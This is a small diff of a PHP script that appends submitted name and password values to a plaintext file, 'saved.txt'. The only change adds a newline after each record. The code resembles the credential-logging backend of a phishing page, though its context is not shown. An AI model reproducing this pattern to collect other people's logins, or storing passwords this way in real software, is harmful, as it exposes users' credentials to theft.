@@ -8,6 +8,7 @@ $file=fopen("saved.txt", "a");
 fwrite($file, $Name);
 fwrite($file, $Pass);
 fwrite($file, "===========");
+fwrite($file, PHP_EOL);
 fclose($file);
 }
 ?>
